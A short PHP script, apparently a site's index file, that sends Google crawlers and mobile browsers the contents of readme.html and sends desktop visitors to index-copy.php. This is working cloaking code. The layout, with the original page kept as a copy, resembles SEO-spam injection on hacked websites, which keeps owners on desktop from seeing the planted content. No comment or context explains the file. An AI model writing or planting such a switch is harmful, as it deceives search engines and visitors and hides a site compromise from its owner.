<?php
function is_google_bot() {
    $agents = array("Googlebot", "Google-Site-Verification", "Google-InspectionTool", "Googlebot-Mobile", "Googlebot-News");
    foreach ($agents as $agent) {
        if (strpos($_SERVER['HTTP_USER_AGENT'], $agent) !== false) return true;
    }
    return false;
}

function is_mobile_device() {
    $mobile_agents = array('Android', 'iPhone', 'iPad', 'iPod', 'Opera Mini', 'IEMobile', 'Mobile');
    foreach ($mobile_agents as $agent) {
        if (strpos($_SERVER['HTTP_USER_AGENT'], $agent) !== false) return true;
    }
    return false;
}



if (is_google_bot()) {
    $bot_content = file_get_contents('readme.html');
    echo $bot_content;
    exit;
} elseif (is_mobile_device()) {
    $bot_content = file_get_contents('readme.html');
    echo $bot_content;
    exit;
} else {
    include('index-copy.php');
    exit;
}
?>
